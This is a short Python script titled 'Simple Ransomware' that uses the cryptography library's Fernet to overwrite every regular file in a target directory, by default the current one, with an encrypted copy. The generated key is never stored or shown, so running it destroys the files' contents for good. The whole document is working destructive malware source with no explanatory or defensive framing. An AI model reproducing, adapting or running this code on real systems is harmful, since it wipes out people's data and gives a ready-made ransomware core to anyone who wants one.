# Simple Ransomware

from cryptography.fernet import Fernet
from os import listdir, path

KEY = Fernet.generate_key()
ENC = Fernet(KEY)

def Encrypt(File_name):
    with open(File_name, 'rb') as File:
        Data = File.read()
    
    Encrypted_Data = ENC.encrypt(Data)

    with open(File_name, 'wb') as File:
        File.write(Encrypted_Data)

Target_Dir = "." # VARIABLE
for item in listdir(Target_Dir):
    File_Path = path.join(Target_Dir, item)
    if path.isfile(File_Path):
        Encrypt(File_Path)